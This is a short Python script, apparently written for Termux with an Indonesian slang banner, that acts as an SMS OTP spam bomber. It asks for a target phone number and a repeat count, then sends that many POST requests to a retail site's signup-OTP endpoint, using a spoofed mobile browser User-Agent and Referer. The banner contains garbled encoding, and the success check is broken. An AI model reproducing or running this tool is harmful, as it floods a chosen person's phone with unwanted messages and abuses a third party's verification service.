import json
import requests
import sys
import os




def main():
	os.system('clear')
	os.system('figlet cemonk01   x Tiktod')
	os.system("termux-open-url https://vt.tiktok.com/ZGJAfDGea/")
	banner = '''
\033[1;32m
ππΌ πππ½πππ ππΎππππ πππππΓΓΓΓΓ πΌππππππ
πΎπΌππΏπΌ πππ½ οΏ½


[+]Made by :\033[1;35mCΝEΝMΝOΝNΝKΝ01
\033[1;32m
[+]Tiktod :\033[1;35mjigongbapakau_
\033[1;32m

ββββββββββββββββββββββββββββββββββββββββββΒ»

 πΎπΌππ πππΌππ πΏπΌππ πΌππππΌ 0 ππΌ π½ππ!
  =\033[1;35m 08************
\033[1;32m
ββββββββββββββββββββββββββββββββββββββββ

#catatan\033[1;32m =\033[1;35m jika kau pikir kepergian mu membuat ku lebih baik. Engkau sangat salah,karena aku hanya bersembunyi di balik kata bijak agar kau percaya aku terlihat tegar!!!
\033[1;32m#Lord-sesath
\033[1;32m

<><><><><><><><><><><><><><><><><><><><><><>ΒΏ!'''




	print(banner)

	print('\033[1;32mlangsung gas aja kawand jangan banyak kecod ')


	no = input('\033[1;32mmasukin no targetnya cok :\033[1;35m ')

	jum = input('\033[1;32mini jumlah spam nya tod : \033[1;35m')





	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}



	dat = {
	'phone' : no
	}


	for x in range(int(jum)) :
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)




	if 'eror' in leosureo:

		print('gagal mengirim cok' + no)

	else:
		print('\033[1;32msuccses mengirim tod ke :' +'\033[1;35m', no), 



		print('\033[1;32mJANGAN DI SALAH GUNAKAN TOD APALAGI BUAT SPAM MAK LU NANTI DI KICK DARI KK!!!!'
	)




main()
